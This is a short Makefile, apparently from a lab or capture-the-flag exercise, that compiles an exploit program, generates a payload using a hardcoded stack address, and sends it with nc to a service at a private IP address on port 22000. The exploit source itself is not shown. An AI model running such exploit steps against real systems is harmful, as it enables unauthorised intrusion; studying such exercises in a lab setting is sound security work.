default:
	gcc rs_exploit.c -o rs_exploit

gen_string:
	./rs_exploit 0x7fffffffe280 > temp

exploit:
	nc 172.16.197.135 22000 < temp

clean:
	rm rs_exploit temp
